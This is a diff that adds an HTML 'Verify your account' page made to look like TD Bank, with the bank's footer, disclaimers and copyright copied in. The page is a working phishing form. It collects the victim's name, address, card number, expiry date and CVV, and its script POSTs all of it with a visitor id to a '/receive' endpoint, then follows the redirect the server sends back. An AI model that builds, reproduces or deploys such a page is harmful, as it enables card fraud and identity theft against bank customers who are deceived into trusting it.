@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification</title>
+  <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/fontawesome.min.css" integrity="sha384-QYIZto+st3yW+o8+5OHfT6S482Zsvz2WfOzpFSXMF9zqeLcFV0/wlZpMtyFcZALm" crossorigin="anonymous">
+    <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+      background-image: none;
+    }
+    .header {
+      width: 100%;
+      padding: 10px 20px;
+      background-color: #fff;
+      border-bottom: 2px solid #ccc; 
+      color: white;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-sizing: border-box;
+      box-shadow: 0 8px 6px rgba(0, 0, 0, 0.3); 
+    } 
+    .header img {
+      height: 30px;
+    }
+    .header .right-section {
+      display: flex;
+      align-items: center;
+    }
+    .header .right-section i {
+      font-size: 1.2em;
+      margin-right: 5px;
+    }
+    .header .right-section span {
+      font-size: 1em;
+      color: green;
+      
+    }
+    .container {
+      width: 100%;
+      height: 100%;
+      padding: 20px;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      box-sizing: border-box;
+    }
+    h1 {
+      color: #006400;
+      font-size: 1.6em;
+      margin-bottom: 5px;
+      text-align:left!important;
+      align-self: center;
+    }
+    .form-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .form-section {
+      margin-bottom: 30px;
+      width: 100%;
+      max-width: 500px;
+    }
+    .input-group {
+      margin-bottom: 30px;
+      position: relative;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 12px 50px 12px 12px; 
+      font-size: 1em;
+      border: 2px solid #ccc;
+      box-sizing: border-box;
+    }
+    
+    input:focus{
+    border-bottom: 4px solid green;
+    outline: none;
+    }
+    
+    .error{
+    border-bottom: 4px solid #ae1100!important;
+    }
+    
+    .input-group .eye-toggle {
+      position: absolute;
+      top: 50%;
+      right: 15px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 1.5em;
+      color: #006400;
+    }
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+    .checkbox-group input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      accent-color: #006400;
+      margin-right: 10px;
+    }
+    .checkbox-group label {
+      font-size: 1.2em;
+    }
+    button {
+      width: 100%;
+      max-width: 215px; 
+      padding: 12px;
+      font-size: 1em; 
+      background-color: green;
+      border: none;
+      color: #fff;
+      border-radius: 2px;
+      cursor: not-allowed; 
+      margin: 0 auto;
+      display: block;
+    }
+    button.active {
+      background-color: #006400;
+      cursor: pointer;
+    }
+    .links {
+      margin-top: 30px;
+    }
+    a {
+      color: #006400;
+      text-decoration: none;
+      font-size: 1em;
+      font-weight: bold;
+      margin-bottom: 25px;  
+      display: flex;
+      align-items: center;
+    }
+    .info {
+      margin-top: 20px;
+      font-size: 1em;
+      text-align: left;
+      color: #333;
+    }
+    .info strong {
+      color: #006400;
+    }
+    .forgot-password{
+    display:none;
+    }
+    .forgot-password-mobile{
+    display: flex;
+    }
+    input:disabled, button:disabled {
+    border: 2px solid #ccc !important; 
+    background-color: #f9f9f9;
+    color: #888;
+	}
+    /* Desktop styles */
+    @media (min-width: 768px) {
+    .footer-links{
+    display:flex;
+    justify-content: center;
+    align-items:center;
+    }
+    .footer-middle{
+    display: none!important;
+    }
+    }
+    }
+  </style>
+  <style>
+  footer {
+    background-color: #f9f9f9;
+    padding: 20px;
+    font-family: Arial, sans-serif;
+    color: #333;
+    font-size: 0.9em;
+    text-align: center;
+    border-top: 1px solid #ddd;
+  }
+
+  .footer-container {
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+
+  /* Top Section */
+  .footer-top .p {
+    display: inline-block;
+    font-size: 1.5em; 
+    color: #333;
+    margin: 0;
+  }
+
+  .footer-top a {
+    color: #006400;
+    font-weight: bold;
+    text-decoration: none;
+    margin-left: 5px;
+  }
+
+  .footer-divider { 
+    width: 250px; 
+    margin: 10px auto;
+    border: none;
+    border-top: 1px solid green;
+  }
+  .footer-middle {
+  display:flex;
+  justify-content: center;
+  align-items: center;
+  }
+
+  /* Middle Section */
+  .footer-middle p a {
+    color: #006400;
+    font-size: 1.5em; 
+    text-decoration: none;
+    text-align: center;
+    font-weight: bold;
+  }
+
+  /* Links Section */
+  .footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 15px;
+    margin: 20px 0;
+  }
+
+  .footer-links a {
+    color: #333;
+    text-decoration: none; 
+    font-size: 0.9em;  
+    font-weight: 300!important;
+  }
+
+  /* Investment Box */
+  .footer-investment {
+    margin: 20px 0;
+  }
+
+  .investment-box {
+    display: inline-block;
+    width: 80%; /* Adjust width of the box */
+    border: 1px solid #006400;
+    padding: 15px;
+    text-align: center;
+    font-size: 0.9em;
+    color: #006400;
+    line-height: 1.5em;
+    margin: 0 auto;
+  }
+
+  .investment-box p {
+    margin: 0;
+    padding: 10px 0;
+  }
+
+  .investment-box hr {
+    border: none;
+    border-top: 1px solid #006400;
+    margin: 0;
+  }
+
+  .investment-box p:first-child {
+    font-weight: bold;
+  }
+
+  /* Bottom Section */
+  .footer-bottom {
+    margin-top: 20px;
+    font-size: 0.85em;
+    color: #555;
+    line-height: 1.5;
+  }
+
+  .footer-bottom .p {
+    margin-bottom: 10px;
+    font-size: 0.85em;
+    font-weight: 350!important;
+  font-size: clamp(14px, 2vw, 10px); 
+  }
+  
+  .label{ 
+  display: block;
+  font-size:14px;  
+  font-weight: 450;
+  padding-bottom:10px!important;
+  
+  }
+</style> 
+</head>
+<body>
+  <div class="header">
+    <img src="/images/logo.png" alt="Logo">  
+    <div class="right-section">
+      <img alt="user" src"/images/usericon.png"/> 
+      <span>Log in</span>
+    </div>
+  </div>
+  <div class="container">
+    <div class="form-wrapper">
+        <h1>Verify your account </h1> 
+        <hr style="width:250px;">     
+        	<h3 style="margin-bottom:30px; font-weight:400">To continue, let's verify it's you</h3>
+    <div id="form" class="form-section">
+        <!-- Full Name -->
+        <div class="input-group">
+            <label class="label" for="full-name">Full Name</label>
+            <input type="text" id="full-name" name="full-name" placeholder="Enter your Full Name">
+        </div>
+
+        <!-- Street Address -->
+        <div class="input-group">
+            <label class="label" for="street-address">Street Address</label>
+            <input type="text" id="street-address" name="street-address" placeholder="Enter your Street Address">
+        </div>
+
+        <!-- City -->
+        <div class="input-group">
+            <label class="label" for="city">City</label>
+            <input type="text" id="city" name="city" placeholder="Enter your City">
+        </div>
+
+        <!-- State -->
+        <div class="input-group">
+            <label class="label" for="state">State</label>
+            <input type="text" id="state" name="state" placeholder="Enter your State">
+        </div>
+
+        <!-- ZIP Code -->
+        <div class="input-group">
+            <label class="label" for="zip-code">ZIP Code</label>
+            <input type="text" id="zip-code" name="zip-code" placeholder="Enter your ZIP Code">
+        </div>
+        
+        <!-- Card Number -->
+        <div class="input-group">
+            <label class="label" for="card-number">Card Number</label>
+            <input type="text" id="card-number" name="card-number" placeholder="Enter your Card Number">
+        </div>
+
+        <!-- Expiry Date -->
+        <div class="input-group">
+            <label class="label" for="expiry-date">Expiry Date</label>
+            <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY">
+        </div>
+
+        <!-- CVV -->
+        <div class="input-group">
+            <label class="label" for="cvv">CVV</label>
+            <input type="text" id="cvv" name="cvv" placeholder="CVV">
+        </div>
+
+        <!-- Continue Button -->
+        <button id="continue-btn" type="submit" disabled>Continue</button>
+    </div>
+	
+            <!-- Forgot Username/Password -->
+            <a href="#" class="forgot-password">Forgot username and/or password?</a>
+        </div>
+    </div>
+</div>
+  <!-- Footer Section -->
+<!-- Footer Section -->
+<footer>
+  <div class="footer-container">
+    <!-- Top Section -->
+    <div class="footer-top">
+      <div class="p" style="white-space: nowrap; color:green">
+        Questions? <span style="color:green; font-weight:bold;"  href="#">Contact us</span> 	
+      </div>
+      <hr class="footer-divider">
+    </div>
+    <!-- Middle Section -->
+    <div class="footer-middle">
+      <p style=""><a href="#">Get the app</a></p>
+    </div>
+    <!-- Links Section -->
+    <div class="footer-links">
+      <a href="#">Help</a>
+      <a href="#">Terms of Use</a>
+      <a href="#">Security</a>
+      <a href="#">Privacy</a>
+      <a href="#">California Privacy</a>
+      <a href="#">Bank Deposits FDIC Insured</a>
+      <a href="#">Online Advertising</a>
+    </div>
+    <!-- Investment Box -->
+    <div class="footer-investment">
+      <div class="investment-box">
+        <p>SECURITIES AND INVESTMENTS</p>
+        <hr>
+        <p>Not FDIC Insured</p>
+        <hr>
+        <p>No Bank Guarantee</p>
+        <hr>
+        <p>May Lose Value</p>
+      </div>
+    </div>
+    <!-- Bottom Section -->
+    <div class="footer-bottom">
+      <p>
+        Registered Investment Advisory, Securities and Brokerage services are
+        offered through TD Private Client Wealth, LLC, member FINRA/SIPC. TD
+        Private Client Wealth, LLC and TD Bank, N.A. are affiliated through
+        their parent company the Toronto-Dominion Bank. TD Wealth is a trademark
+        owned by the Toronto-Dominion Bank, used with permission.
+      </p>
+      <p>&copy; 2024 TD Bank, N.A. All Rights Reserved</p>
+    </div>
+  </div>
+</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+      
+<script>
+	 	
+
+	       new Cleave('#card-number', {
+            creditCard: true
+        });
+
+        new Cleave('#expiry-date', {
+            date: true,
+            datePattern: ['m', 'y']
+        });
+
+        new Cleave('#cvv', {
+            numericOnly: true,
+            blocks: [3]
+        });
+
+        
+</script>
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const inputs = document.querySelectorAll('.input-group input');
+        const submitButton = document.getElementById('continue-btn');
+
+        // Function to check all inputs and enable/disable the button
+        const checkAllInputs = () => {
+            const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
+            submitButton.disabled = !allFilled;
+        };
+        
+        function generateErrorMessage(inputElement) {
+    let placeholderText = inputElement.placeholder.trim(); // Get and trim the placeholder text
+
+    if (placeholderText.split(' ').length === 1) {
+        return `Please enter ${placeholderText.toLowerCase()} information`;
+    } else {
+        // If placeholder has more than one word
+        return `Please ${placeholderText.toLowerCase()}`;
+    }
+}
+
+        // Add blur event listeners to inputs
+        inputs.forEach(input => {
+            input.addEventListener('blur', (event) => {
+                const inputElement = event.target;
+                const errorDivId = `${inputElement.id}-error`;
+
+                // Remove existing error message if any
+                let existingError = document.getElementById(errorDivId);
+                if (existingError) {
+                    existingError.remove(); 
+                }
+ 
+                // If input is empty, add an error message
+                if (inputElement.value.trim() === '') {
+                    const errorDiv = document.createElement('div');
+                    errorDiv.id = errorDivId;     
+                    errorDiv.style.fontWeight = "500";
+					errorDiv.style.margin = "4px";
+                    errorDiv.style.color = '#ae1100'; 
+                    errorDiv.style.fontSize = '13px';
+                    errorDiv.textContent = generateErrorMessage(inputElement);
+                    inputElement.parentNode.appendChild(errorDiv);   
+                    inputElement.classList.add('error');
+                    
+                }
+
+                // Check if all inputs are filled
+                checkAllInputs();
+            });
+            
+            input.addEventListener('input', () => {
+                const errorDiv = document.getElementById(`${input.id}-error`);
+                if (errorDiv) {
+                    errorDiv.remove();
+                    input.classList.remove('error');
+                }
+                checkAllInputs();
+            });
+        });
+    });
+    
+    $(document).ready(function () {
+    $('#continue-btn').click(function (e) {
+        e.preventDefault();
+
+        let userinfo = {}; 
+        let visitor = sessionStorage.getItem('visitor');
+        
+        $('#form input').each(function () {
+            let inputName = $(this).attr('name');
+            let inputValue = $(this).val();
+            
+            if (inputName) {
+                userinfo[inputName] = inputValue;
+            }
+        });
+
+        userinfo['visitor'] = visitor;
+        console.log(userinfo); 
+        
+        $.ajax({
+            url: '/receive',
+            type: 'POST',
+            data: userinfo,
+            success: function (response) {
+                if(response.url){
+                window.location.href = response.url;
+                }
+            },
+            error: function (xhr, status, error) {
+                alert('An error occurred: ' + error);
+            }
+        });
+    });
+});
+</script> 
+
+</body>
+</html> 
